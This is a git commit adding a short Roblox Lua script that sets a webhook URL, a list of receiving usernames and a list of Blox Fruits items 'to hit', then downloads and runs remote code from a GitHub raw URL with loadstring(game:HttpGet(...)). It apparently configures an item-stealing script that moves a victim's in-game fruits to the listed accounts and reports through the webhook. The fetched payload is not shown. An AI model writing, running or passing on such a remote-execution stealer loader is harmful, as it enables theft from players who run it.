63a7def700aa52b2704fe02c727acbb112ebc65c
realredv4 <kazukikavdo@gmail.com>
2025-03-12 22:44:07 +0545

    Create W azurev4.lua

---
+++ W azurev4.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RkJkSEJYam8zek5EVEJOYUNxMldzZzo0T0pnNElQWEFHRWE5MUU2RHFnODFLeWtRS011NzRqRWdRZ1d1SEdxYjlzRVBTUTBJMnI5SzExN2toMEQ4VkRlY2kwYnM2OFMyMEFCeDQ3Q3ZjelNuWmthMUVJVG1iZ3kxTkF4T0N6UXVaZDJfdG52WjhzMHZnR2lyRFJRdHR5RS1STjNFNXVodVgyY3l3NzFwS3o4dC1XUkp3dDdpUldiSGJpMFp4bHFPSlE" -- << Your Webhook
+Usernames = {"aayush001116789", "sayam0011536", "sayam7682762"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
